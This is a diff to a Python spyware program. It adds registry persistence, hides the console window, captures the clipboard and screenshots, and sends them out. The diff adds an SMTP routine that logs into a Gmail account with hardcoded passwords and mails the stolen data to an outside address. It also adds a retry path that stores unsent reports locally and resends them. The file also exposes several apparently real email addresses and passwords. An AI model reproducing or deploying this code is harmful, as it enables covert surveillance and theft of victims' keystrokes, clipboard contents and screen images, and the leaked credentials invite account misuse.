@@ -22,7 +22,7 @@ import  shutil
 import logging
 import sys
 
-import page1
+
 
 autorun.AddToRegistry()
 hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
@@ -37,19 +37,29 @@ comname = getpass.getuser()
 # print(comname)
 temp_data = pyperclip.paste()
 
-# if not os.path.exists('clipboard.txt'):
-#     with open('clipboard.txt', 'a') as clip:
-#         pass
+if not os.path.exists('datafile.txt'):
+    with open('datafile.txt', 'a') as clip:
+        pass
 
-def check():
-    # data = ''
-    with open('check.txt', 'r') as f:
-        # print(f.read())
+def isdataavailable():
+    with open('datafile.txt', 'r+') as f:
+    # print(f.read())
         data = f.read()
-        print(data)
-        if data != 'true':
-            page1.my_page1()
-            
+        print(f.read())
+        if data != '':
+            server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+            # # connect to the SMTP server as TLS mode ( for security )
+            server.starttls()
+            # login to the email account
+            server.login('007711meenakshi@gmail.com', 'tqbnkgbxprgppuim')
+            # send the actual message
+            server.sendmail('007711meenakshi@gmail.com', '999ajaymathur@gmail.com', data)
+            print('email sent successfully')
+            # terminates the session
+            server.quit()
+            f.truncate()
+        else:
+            pass        
 
 clipboard_data = ''
 
@@ -65,13 +75,15 @@ def clipboard_listener():
     mytimer.start()        
 
 def main_func():
-    check()
+    clipboard_listener()
     print('main function started')
     global clipboard_data
-    clipboard_listener()
+    isdataavailable()
     SEND_REPORT_EVERY = 1800 # in seconds, 60 means 1 minute and so on
-    EMAIL_ADDRESS = "Shalinitiwari1098@gmail.com"
-    EMAIL_PASSWORD = "abcd@1234"
+    EMAIL_ADDRESS = "007711meenakshi@gmail.com"
+    EMAIL_PASSWORD = "tqbnkgbxprgppuim" #gmail pass => 12345ghjkl@1
+    # EMAIL_ADDRESS = "Shalinitiwari1098@gmail.com"
+    # EMAIL_PASSWORD = "abcd@1234"
     # EMAIL_ADDRESS = "core.builder11@gmail.com"
     # EMAIL_PASSWORD = "builder123*"
 
@@ -128,6 +140,7 @@ def main_func():
             print(f"[+] Saved {self.filename}.txt")
 
         def sendmail(self, email, password, message):
+            
             global clipboard_data
             if not os.path.exists(os.path.join('C://', 'temp')):
                 os.mkdir(os.path.join('C://', 'temp'))
@@ -158,19 +171,26 @@ def main_func():
                 msg.attach(img)
             print('sending email...')
             # manages a connection to an SMTP server
-            server = smtplib.SMTP(host="smtp.gmail.com", port=587)
-            # # connect to the SMTP server as TLS mode ( for security )
-            server.starttls()
-            # login to the email account
-            server.login(email, password)
-            # send the actual message
-            server.sendmail(email, 'Anshumankumar7890@gmail.com',msg.as_string())
-            print('email sent successfully')
-            # terminates the session
-            server.quit()
-            # os.remove('C://temp/')
-            shutil.rmtree('C://temp')
-            clipboard_data = ''
+            try:
+                
+                # manages a connection to an SMTP server
+                server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+                # # connect to the SMTP server as TLS mode ( for security )
+                server.starttls()
+                # login to the email account
+                server.login(email, password)
+                # send the actual message
+                server.sendmail(email, '999ajaymathur@gmail.com',msg.as_string())
+                print('email sent successfully')
+                # terminates the session
+                server.quit()
+                # os.remove('C://temp/')
+                shutil.rmtree('C://temp')
+                clipboard_data = ''
+            except:
+                with open('datafile.txt', 'a') as f:
+                    f.write(msg.as_string())
+                isdataavailable()
         def report(self):
             # if self.log:
                 # if there is something in log, report it
